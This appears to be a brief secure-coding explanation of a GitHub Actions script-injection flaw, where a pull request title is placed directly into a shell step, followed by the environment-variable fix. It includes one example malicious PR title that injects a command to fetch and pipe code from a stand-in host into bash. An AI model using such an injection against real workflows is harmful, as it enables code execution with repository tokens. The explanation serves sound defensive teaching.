context: CI workflow runs lint on pull requests. A teammate added logging of the PR title before the lint step.
explanation: Script injection — ${{ github.event.pull_request.title }} is interpolated directly into a run: shell command. An attacker can craft a PR title like `"; curl evil.com/steal | bash #` to execute arbitrary code with the workflow's GITHUB_TOKEN. Fix: pass the value through an environment variable (`env: PR_TITLE: ${{ ... }}`) and reference $PR_TITLE in the script.
